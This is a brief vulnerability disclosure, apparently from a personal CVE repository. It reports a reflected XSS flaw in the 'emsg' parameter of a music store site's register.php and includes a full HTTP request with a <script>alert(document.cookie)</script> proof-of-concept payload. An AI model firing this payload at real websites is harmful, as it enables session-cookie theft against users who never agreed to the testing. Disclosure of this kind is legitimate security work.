# Vulnerability music store website

![](https://raw.githubusercontent.com/Th4r0s/my_CVE/main/web/vuln1/docs/vuln_website.png)
![](https://raw.githubusercontent.com/Th4r0s/my_CVE/main/web/vuln1/docs/xss-triggered.png)

## description

The emsg GET parameter used for prompt error message in case of missing field in register form is vulnerable to reflected XSS.
Is possible to inject javascript code and prompt document cookie.

## vulnerability 

```
GET /mw/register.php?emsg=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/2
Host: vulnhost.com
Cookie: PHPSESSID=tttbitb72h0efdddda4ft9q8e2f
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
```
## Description:

JavaScript can be injected into the application (a vulnerable app - register.php, no sanitizing emsg GET parameter).


